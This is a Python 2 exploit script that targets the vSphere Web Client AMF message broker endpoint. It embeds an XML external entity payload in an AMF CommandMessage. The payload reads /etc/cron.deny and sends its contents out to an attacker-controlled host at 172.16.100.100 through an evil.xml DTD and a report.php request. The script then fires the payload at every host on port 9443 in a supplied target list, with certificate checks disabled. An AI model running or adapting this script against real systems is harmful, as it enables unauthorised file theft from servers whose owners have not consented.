import sys
import pyamf
import pyamf.remoting
from pyamf.flex.messaging import CommandMessage
from pyamf import xml
import requests
requests.packages.urllib3.disable_warnings()

xxexml='''<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///etc/cron.deny">
<!ENTITY % remote SYSTEM "http://172.16.100.100/evil.xml">
%remote;
%all;
%send;
]>'''
evil_xml = '''<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://172.16.100.100/report.php?file=%file;'>">'''

xmlp='<a>'+'x'*(len(xxexml)-7)+'</a>'
xmlObj = xml.fromstring(xmlp)
amfReq = CommandMessage(operation=5,
                         destination=u'',
                         messageID=u'F9E40DCB-78E2-68AD-0BC9-A56F41399B88',
                         body=xmlObj,
                         clientId=None,
                         headers={'DSID':u'nil',
                                  'DSMessagingVersion':1.0})
envelope = pyamf.remoting.Envelope(amfVersion=3)
envelope["/%d" % 1] = pyamf.remoting.Request(u'null', [amfReq])
message = pyamf.remoting.encode(envelope)
msg = message.getvalue()
msg=msg.replace(xmlp,xxexml)
print 'payload: %r' % (msg)

targets = []
for f in open(sys.argv[1]):
    try:
        ip,t,port = f.strip().split(',')
        if int(port)==9443:
            targets.append(ip+':'+port)
    except:
        pass


url_fmt = 'https://%s/vsphere-client/endpoints/messagebroker/amfsecure'
referer_fmt = 'https://%s/vsphere-client/UI.swf/[[DYNAMIC]]/6'

for target in targets:
    url = url_fmt % (target)
    referer = referer_fmt % (target)
    headers = {'Content-Type': 'application/x-amf', 'Referer': referer}
    print '*Testing: %s' % (url)
    try:
        rs = requests.post(url, data=msg, headers=headers, verify=False, timeout=8)
        print '*ret: %r' % (rs.content)
        content = pyamf.remoting.decode(rs.content)
        print '*ret: %s' % (content)
    except Exception as e:
        print 'Err: %s' % (str(e))
    print
    print
